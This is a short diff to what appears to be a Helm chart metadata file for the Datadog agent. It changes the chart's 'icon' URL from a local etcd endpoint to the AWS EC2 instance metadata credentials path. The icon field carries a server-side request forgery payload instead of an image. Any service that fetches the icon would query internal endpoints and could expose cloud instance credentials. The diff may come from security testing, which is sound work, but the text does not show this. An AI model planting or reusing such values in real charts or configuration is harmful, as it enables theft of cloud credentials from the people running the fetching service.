@@ -7,7 +7,7 @@ keywords:
 - alerting
 - metric
 home: https://www.datadoghq.com
-icon: http://127.0.0.1:2379/version?a=.json
+icon: http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance
 sources:
 - https://app.datadoghq.com/account/settings#agent/kubernetes
 - https://github.com/DataDog/datadog-agent
